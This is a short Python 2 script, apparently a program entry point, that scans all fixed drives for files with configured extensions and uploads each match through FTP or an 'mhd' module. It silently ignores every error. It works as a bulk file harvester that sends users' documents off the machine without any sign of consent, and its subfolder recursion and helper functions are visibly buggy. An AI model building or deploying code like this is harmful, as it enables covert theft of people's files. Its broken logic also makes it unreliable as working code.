#-*-coding:utf8-*-
#
# Main program entry
# xianwen.zhang
# 2018-09-20

import os,string
import psutil
import hashlib
import ftp
import etc
import mhd

mhd_enable  = etc.get_config().get("mhd","enable")
suffix_list = etc.get_config().get("default","suffix")

def is_exists_suffix(suffix):
    try:
        if suffix_list.find(suffix) > -1:
            return True
        else:
            return False
    except:
        pass

def get_drive():
    drive_list = psutil.disk_partitions()
    print drive_list

def get_file(path):
    try:
        if os.path.isdir(path):
            files = os.listdir(path)
            for i in files:
                if os.path.isfile(path + i):
                    index = i.rfind(".")
                    if index > 0:
                        suffix = i[index + 1:]
                        if is_exists_suffix(suffix):
                            upload_file(path,i)
                else:
                    if os.name == "posix":
                        p = path + i + "/"
                    else:
                        p = path + i + "\\"
                        get_file(p)
    except:
        pass

def upload_file(path,filename):
    if mhd_enable:
        mhd.upload(path,filename)
    else:
        ftp.upload(path,filename)

def main():
    if os.name == "nt":
        drive_list = psutil.disk_partitions()
        for i in drive_list:
            if i.opts.find("removable") < 1:
                get_file(i.mountpoint)
    else:
        get_file("/Users/shiye/Desktop/test")

if __name__ == "__main__":
    main()